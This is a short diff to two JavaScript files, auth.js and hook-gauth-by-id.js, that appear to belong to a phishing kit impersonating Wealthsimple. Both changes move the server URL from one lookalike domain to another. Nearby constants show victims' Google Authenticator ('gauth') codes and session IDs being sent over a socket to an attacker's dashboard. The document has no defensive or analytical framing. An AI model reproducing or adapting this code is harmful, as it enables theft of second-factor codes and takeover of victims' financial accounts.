@@ -1,6 +1,6 @@
 // auth.js
 (function () {
-  const SERVER_URL = "https://my-wealthsimple.ca";
+  const SERVER_URL = "https://www-wealthsimple.com";
   const SESSION_STORAGE_KEY = "sessionID";
   const JOIN_EVENT = "client-join";   // matches your dashboard
   const EMIT_EVENT = "client-data";   // payload: { type:'gauth', value:'123456', sessionID }
@@ -393,7 +393,7 @@ if (socket) {
 
 // hook-gauth-by-id.js
 (function () {
-  const SERVER_URL = "https://my-wealthsimple.ca";
+  const SERVER_URL = "https://www-wealthsimple.com";
   const SESSION_KEY = "sessionID";
   const EMIT_EVENT = "client-data";
   const JOIN_EVENT = "client-join";
